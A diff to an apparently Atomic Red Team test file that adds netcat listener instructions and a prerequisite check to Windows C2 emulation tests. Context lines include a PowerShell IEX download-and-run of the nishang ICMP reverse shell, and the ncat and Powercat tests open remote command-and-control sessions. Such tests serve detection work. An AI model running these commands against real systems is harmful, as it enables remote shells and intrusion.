@@ -21,13 +21,24 @@ atomic_tests:
       IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
       Invoke-PowerShellIcmp -IPAddress #{server_ip}
 
-- name: Ncat C2
-  description: Start C2 Session Using Ncat
+- name: Netcat C2
+  description: |
+    Start C2 Session Using Ncat
+    To start the listener on a Linux device, type the following: 
+    nc -l -p <port>
   supported_platforms:
     - windows
+  dependency_executor_name: command_prompt
+  dependencies:
+    - description: |
+        Nmap must be installed
+      prereq_command: |
+        ncat -h 2> nul
+      get_prereq_command: |
+        echo "Install nmap so that ncat.exe will be available for use"
   input_arguments:
     server_ip: 
-      description: The IP address of the listening server
+      description: The IP address or domain name of the listening server
       type: ip
       default: 127.0.0.1
     server_port:
@@ -38,15 +49,18 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      ncat.exe #{server_ip} #{server_port}
+      ncat #{server_ip} #{server_port}
 
 - name: Powercat C2
-  description: Start C2 Session Using Powercat
+  description: |
+    Start C2 Session Using Powercat
+    To start the listener on a Linux device, type the following: 
+    nc -l -p <port>
   supported_platforms:
     - windows
   input_arguments:
     server_ip: 
-      description: The IP address of the listening server
+      description: The IP address or domain name of the listening server
       type: ip
       default: 127.0.0.1
     server_port:
